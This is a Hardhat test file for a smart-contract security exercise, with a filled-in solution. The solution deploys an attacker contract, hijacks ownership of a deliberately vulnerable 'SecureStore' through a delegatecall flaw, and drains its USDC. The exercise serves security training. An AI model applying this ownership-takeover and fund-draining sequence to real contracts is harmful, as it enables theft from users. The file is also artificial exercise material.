const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('Delegatecall', function () {
  let deployer, attacker, secureStore, registry, usdc;

  before(async () => {
    /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

    [deployer, attacker] = await ethers.getSigners();

    const Registry = await ethers.getContractFactory('Registry');
    registry = await Registry.connect(deployer).deploy();

    const USDC = await ethers.getContractFactory("USDC");
    usdc = await USDC.connect(deployer).deploy();

    const SecureStore = await ethers.getContractFactory('SecureStore');
    secureStore = await SecureStore.connect(deployer).deploy(registry.address, 500000, usdc.address);

    // Sending sample USDC to attacker
    await usdc.connect(deployer).mint(attacker.address, ethers.utils.parseEther('10000'));

    // Giving some USDC to the SecureStore
    await usdc.connect(deployer).mint(secureStore.address, ethers.utils.parseEther('10000000')); 

  });

  it('Exploit', async () => {
    /** CODE YOUR SOLUTION HERE */
    const AttackerContract = await ethers.getContractFactory('Attacker');
    const attackerContract = await AttackerContract.connect(attacker).deploy(usdc.address);

    // USDC to attackerContract
    await usdc.connect(attacker).transfer(attackerContract.address, ethers.utils.parseEther('10000'));

    // Setup attacker's address
    await network.provider.send("hardhat_setBalance", [
      attacker.address,
      "0x8AC7230489E80000",
    ]);

    // Change the address of the Registry
    await attackerContract.connect(attacker).changeWHAddress(secureStore.address);
    
    console.log("first attack called ");
    // Advance the block timestamp by 1 day
    await network.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]);

    // Change the owner to the attacker's address
    await attackerContract.connect(attacker).changeOwner(secureStore.address);
    console.log(await secureStore.owner());
    console.log(await attacker.address);

    // Withdrawing the SecureStore's funds
    const attackerBefore = await usdc.balanceOf(attacker.address);
    console.log("Attacker's balance before ", attackerBefore);
    
    // Withdraw all the funds from the SecureStore
    await secureStore.connect(attacker).withdrawAll();

    const attackAfter = await usdc.balanceOf(attacker.address);
    expect(attackAfter).to.gt(attackerBefore);
  });

  after(async () => {
    /** SUCCESS CONDITIONS */
    expect(await secureStore.owner()).to.eq(attacker.address);
    const balanceSecureStore = await usdc.balanceOf(secureStore.address);
    expect(balanceSecureStore).to.eq(0);

    // console.log("Attacker's balance after exploit: ", await ethers.provider.getBalance(attacker.address));
  });
});